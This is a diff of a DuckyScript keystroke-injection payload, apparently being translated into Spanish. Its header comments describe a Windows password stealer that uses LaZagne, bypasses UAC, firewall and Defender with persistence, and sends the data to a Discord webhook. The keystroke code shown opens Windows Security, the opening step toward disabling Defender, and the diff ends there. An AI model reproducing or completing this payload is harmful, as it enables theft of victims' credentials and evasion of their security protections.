@@ -1,15 +1,15 @@
-REM Title: Everything Password Stealer
-REM Description: Steals every password in every windows 10 or 11 passwords with LaZagne
-REM Bypasses UAC, Firewall, and Defender with persistence whatsoever
-REM Exfil your data to your not-so private discord server with computer name as a filename (to avoid confusions as usual)
-REM Author: DeadPool (just kidding, created by me, the one and only Spade)
+REM Title: Roba contraseñas
+REM Description: Roba contraseñas en Windows 10/11 (Español)
+REM Bypasses UAC, Firewall, y Defender con persistencia
+REM Exfiltración de datos del equipo a un servidor de discord mediante webhook
+
 
 GUI m
 DELAY 2000
 REM Open Windows Defender Settings
 CTRL ESC
 DELAY 750
-STRING windows security
+STRING Seguridad de Windows
 ENTER
 DELAY 1500
 ENTER
